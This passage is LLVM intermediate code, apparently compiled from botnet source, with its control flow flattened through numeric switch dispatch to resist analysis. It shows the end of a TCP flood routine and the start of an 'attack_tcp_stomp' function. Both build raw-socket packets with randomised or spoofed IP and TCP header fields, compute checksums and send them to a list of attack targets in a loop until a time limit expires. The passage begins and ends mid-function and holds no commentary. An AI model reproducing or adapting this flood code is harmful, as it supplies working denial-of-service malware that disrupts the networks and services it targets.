; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 6
  store i8 6, i8* %188, align 1
  %189 = load i32, i32* %30, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 8
  store i32 %189, i32* %191, align 4
  %192 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i32 0, i32 1
  %197 = load i32, i32* %196, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 9
  store i32 %197, i32* %199, align 4
  %200 = load i16, i16* %18, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  store i16 %201, i16* %203, align 4
  %204 = load i16, i16* %19, align 2
  %205 = call zeroext i16 @htons(i16 zeroext %204) #7
  %206 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 1
  store i16 %205, i16* %207, align 2
  %208 = load i32, i32* %20, align 4
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = zext i16 %210 to i32
  %212 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 2
  store i32 %211, i32* %213, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -241
  %218 = or i16 %217, 80
  store i16 %218, i16* %215, align 4
  %219 = load i8, i8* %22, align 1
  %220 = sext i8 %219 to i16
  %221 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = and i16 %220, 1
  %225 = shl i16 %224, 13
  %226 = and i16 %223, -8193
  %227 = or i16 %226, %225
  store i16 %227, i16* %222, align 4
  %228 = load i8, i8* %23, align 1
  %229 = sext i8 %228 to i16
  %230 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 4
  %232 = load i16, i16* %231, align 4
  %233 = and i16 %229, 1
  %234 = shl i16 %233, 12
  %235 = and i16 %232, -4097
  %236 = or i16 %235, %234
  store i16 %236, i16* %231, align 4
  %237 = load i8, i8* %24, align 1
  %238 = sext i8 %237 to i16
  %239 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = and i16 %238, 1
  %243 = shl i16 %242, 11
  %244 = and i16 %241, -2049
  %245 = or i16 %244, %243
  store i16 %245, i16* %240, align 4
  %246 = load i8, i8* %25, align 1
  %247 = sext i8 %246 to i16
  %248 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %247, 1
  %252 = shl i16 %251, 10
  %253 = and i16 %250, -1025
  %254 = or i16 %253, %252
  store i16 %254, i16* %249, align 4
  %255 = load i8, i8* %26, align 1
  %256 = sext i8 %255 to i16
  %257 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = and i16 %256, 1
  %261 = shl i16 %260, 9
  %262 = and i16 %259, -513
  %263 = or i16 %262, %261
  store i16 %263, i16* %258, align 4
  %264 = load i8, i8* %27, align 1
  %265 = sext i8 %264 to i16
  %266 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %265, 1
  %270 = shl i16 %269, 8
  %271 = and i16 %268, -257
  %272 = or i16 %271, %270
  store i16 %272, i16* %267, align 4
  %273 = call i32 @rand_next()
  %274 = and i32 %273, 65535
  %275 = trunc i32 %274 to i16
  %276 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 5
  store i16 %275, i16* %277, align 2
  %278 = load i8, i8* %24, align 1
  %279 = icmp ne i8 %278, 0
  %280 = select i1 %279, i32 -282661891, i32 1236075261
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 4
  %284 = load i16, i16* %283, align 4
  %285 = and i16 %284, -2049
  %286 = or i16 %285, 2048
  store i16 %286, i16* %283, align 4
  store i32 1236075261, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %34, align 8
  %289 = load i32, i32* %28, align 4
  call void @rand_alpha_str(i8* %288, i32 %289)
  %290 = load i8*, i8** %34, align 8
  %291 = load i32, i32* %28, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds i8, i8* %290, i64 %292
  store i8 0, i8* %293, align 1
  store i32 -1854058645, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %11, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %11, align 4
  store i32 181932633, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  store i32 1435694217, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1961513081, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i32, i32* %11, align 4
  %301 = load i8, i8* %7, align 1
  %302 = zext i8 %301 to i32
  %303 = icmp slt i32 %300, %302
  %304 = select i1 %303, i32 665846747, i32 776017087
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8**, i8*** %13, align 8
  %307 = load i32, i32* %11, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i8*, i8** %306, i64 %308
  %310 = load i8*, i8** %309, align 8
  store i8* %310, i8** %35, align 8
  %311 = load i8*, i8** %35, align 8
  %312 = bitcast i8* %311 to %struct.iphdr*
  store %struct.iphdr* %312, %struct.iphdr** %36, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i64 1
  %315 = bitcast %struct.iphdr* %314 to %struct.tcphdr*
  store %struct.tcphdr* %315, %struct.tcphdr** %37, align 8
  %316 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i64 1
  %318 = bitcast %struct.tcphdr* %317 to i8*
  store i8* %318, i8** %38, align 8
  %319 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %320 = load i32, i32* %11, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 2
  %324 = load i8, i8* %323, align 4
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %325, 32
  %327 = select i1 %326, i32 -237620335, i32 -745839858
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %330 = load i32, i32* %11, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 1
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = call i32 @rand_next()
  %337 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %338 = load i32, i32* %11, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i32 0, i32 2
  %342 = load i8, i8* %341, align 4
  %343 = zext i8 %342 to i32
  %344 = lshr i32 %336, %343
  %345 = add i32 %335, %344
  %346 = call i32 @htonl(i32 %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 9
  store i32 %346, i32* %348, align 4
  store i32 -745839858, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %30, align 4
  %351 = icmp eq i32 %350, -1
  %352 = select i1 %351, i32 366854808, i32 -1864135702
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = call i32 @rand_next()
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  store i32 -1864135702, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i16, i16* %15, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  %361 = select i1 %360, i32 1902159446, i32 -804146366
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 3
  store i16 %365, i16* %367, align 4
  store i32 -804146366, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i16, i16* %18, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  %372 = select i1 %371, i32 -320665745, i32 -2003544445
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  store i16 %376, i16* %378, align 4
  store i32 -2003544445, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i16, i16* %19, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp eq i32 %381, 65535
  %383 = select i1 %382, i32 -195810405, i32 -1343061299
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 1
  store i16 %387, i16* %389, align 2
  store i32 -1343061299, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %20, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -287568527, i32 696734596
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 2
  store i32 %395, i32* %397, align 4
  store i32 696734596, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i32, i32* %21, align 4
  %400 = icmp eq i32 %399, 65535
  %401 = select i1 %400, i32 36432941, i32 -1831013205
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 3
  store i32 %403, i32* %405, align 4
  store i32 -1831013205, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8, i8* %29, align 1
  %408 = icmp ne i8 %407, 0
  %409 = select i1 %408, i32 -743846078, i32 37128615
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i8*, i8** %38, align 8
  %412 = load i32, i32* %28, align 4
  call void @rand_alpha_str(i8* %411, i32 %412)
  %413 = load i8*, i8** %38, align 8
  %414 = load i32, i32* %28, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds i8, i8* %413, i64 %415
  store i8 0, i8* %416, align 1
  store i32 37128615, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 7
  store i16 0, i16* %419, align 2
  %420 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %421 = bitcast %struct.iphdr* %420 to i16*
  %422 = call zeroext i16 @checksum_generic(i16* %421, i32 20)
  %423 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 %422, i16* %424, align 2
  %425 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 6
  store i16 0, i16* %426, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = bitcast %struct.tcphdr* %428 to i8*
  %430 = load i32, i32* %28, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 20, %431
  %433 = trunc i64 %432 to i16
  %434 = call zeroext i16 @htons(i16 zeroext %433) #7
  %435 = load i32, i32* %28, align 4
  %436 = sext i32 %435 to i64
  %437 = add i64 20, %436
  %438 = trunc i64 %437 to i32
  %439 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %427, i8* %429, i16 zeroext %434, i32 %438)
  %440 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 6
  store i16 %439, i16* %441, align 4
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 1
  %444 = load i16, i16* %443, align 2
  %445 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %446 = load i32, i32* %11, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 1
  store i16 %444, i16* %450, align 2
  %451 = load i32, i32* %12, align 4
  %452 = load i8*, i8** %35, align 8
  %453 = load i32, i32* %28, align 4
  %454 = sext i32 %453 to i64
  %455 = add i64 40, %454
  %456 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %457 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %458 = load i32, i32* %11, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i64 %459
  %461 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %460, i32 0, i32 0
  %462 = bitcast %struct.sockaddr_in* %461 to %struct.sockaddr*
  store %struct.sockaddr* %462, %struct.sockaddr** %456, align 8
  %463 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %464 = load %struct.sockaddr*, %struct.sockaddr** %463, align 8
  %465 = call i64 @sendto(i32 %451, i8* %452, i64 %455, i32 16384, %struct.sockaddr* %464, i32 16)
  store i32 1440128617, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i32, i32* %11, align 4
  %468 = add nsw i32 %467, 1
  store i32 %468, i32* %11, align 4
  store i32 1961513081, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = call i64 @time(i64* null) #6
  %471 = load i32, i32* %31, align 4
  %472 = sext i32 %471 to i64
  %473 = icmp sgt i64 %470, %472
  %474 = select i1 %473, i32 -1536936487, i32 1801184419
  store i32 %474, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  store i32 -250460664, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  store i32 1435694217, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %476, %475, %469, %466, %417, %410, %406, %402, %398, %394, %390, %384, %379, %373, %368, %362, %357, %353, %349, %328, %305, %299, %298, %297, %294, %287, %281, %186, %182, %134, %128, %127, %124, %118, %117, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %28, align 4
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -1309016787, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1309016787, label %first
    i32 1236332442, label %114
    i32 -1014458777, label %115
    i32 651374095, label %121
    i32 -1819765034, label %124
    i32 -2116605547, label %125
    i32 1177159017, label %131
    i32 -40841365, label %132
    i32 627584366, label %136
    i32 -299527258, label %137
    i32 -1374312079, label %153
    i32 492389694, label %174
    i32 -1791117669, label %183
    i32 559275813, label %188
    i32 -760796712, label %193
    i32 -1127045348, label %197
    i32 1685324422, label %205
    i32 -787465542, label %217
    i32 -1760989529, label %218
    i32 1787450681, label %227
    i32 823377755, label %232
    i32 -2054541701, label %245
    i32 -571111683, label %254
    i32 -723025591, label %263
    i32 23526114, label %355
    i32 -1182032490, label %359
    i32 42222709, label %485
    i32 1074023110, label %494
    i32 2078080985, label %503
    i32 -221378678, label %506
    i32 1772753383, label %507
    i32 -761005845, label %508
    i32 -1886006807, label %509
    i32 -635337616, label %515
    i32 -603050200, label %518
    i32 707924296, label %519
    i32 278098356, label %520
    i32 769690921, label %523
    i32 1591814268, label %524
    i32 212632030, label %525
    i32 -1200144957, label %531
    i32 -158805784, label %549
    i32 1980702208, label %555
    i32 942230688, label %559
    i32 1671400488, label %566
    i32 -1486911469, label %638
    i32 988037116, label %641
    i32 1018756190, label %647
    i32 -1065907299, label %648
    i32 2020501901, label %649
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %112 = icmp eq i32 %.reload, -1
  %113 = select i1 %112, i32 1236332442, i32 -1014458777
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 2020501901, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %116 = load i32, i32* %12, align 4
  %117 = bitcast i32* %11 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #6
  %119 = icmp eq i32 %118, -1
  %120 = select i1 %119, i32 651374095, i32 -1819765034
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %12, align 4
  %123 = call i32 @close(i32 %122)
  store i32 2020501901, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -2116605547, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %11, align 4
  %127 = load i8, i8* %7, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %126, %128
  %130 = select i1 %129, i32 1177159017, i32 769690921
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 -40841365, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %133, i32* %29, align 4
  %134 = icmp eq i32 %133, -1
  %135 = select i1 %134, i32 627584366, i32 -299527258
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  store i32 278098356, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %29, align 4
  %139 = load i32, i32* %29, align 4
  %140 = call i32 (i32, i32, ...) @fcntl(i32 %139, i32 3, i32 0)
  %141 = or i32 %140, 2048
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %138, i32 4, i32 %141)
  %143 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %143, align 4
  %144 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 2
  %149 = load i8, i8* %148, align 4
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %150, 32
  %152 = select i1 %151, i32 -1374312079, i32 492389694
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %155 = load i32, i32* %11, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = call i32 @ntohl(i32 %159) #7
  %161 = call i32 @rand_next()
  %162 = load %struct.attack_target*, %struct.attack_target** %8, align 8
